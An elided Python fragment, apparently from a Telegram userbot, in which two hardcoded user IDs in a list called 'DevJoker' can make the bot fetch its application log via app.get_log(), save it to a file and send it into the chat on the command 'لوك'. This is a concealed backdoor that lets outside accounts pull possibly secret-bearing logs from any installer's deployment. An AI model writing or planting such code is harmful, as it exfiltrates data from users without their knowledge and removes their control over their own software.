...
DevJoker = [6300938349, 1400467850]
    ...
    if event.reply_to and event.sender_id in DevJoker:
        ...
        if owner_id == l313l.uid:
            if event.message.message == "لوك":
                ...
                data = app.get_log()
                with open('اڤــــتار 🖤.txt', 'w') as file:
        	        file.write(data)

                with open('اڤــــتار 🖤.txt', 'rb') as file:
                    await l313l.send_file(
                    event.chat_id, "اڤــــتار 🖤.txt", caption="هذا هو الـ Log"
                    )
                os.remove("اڤــــتار 🖤.txt")
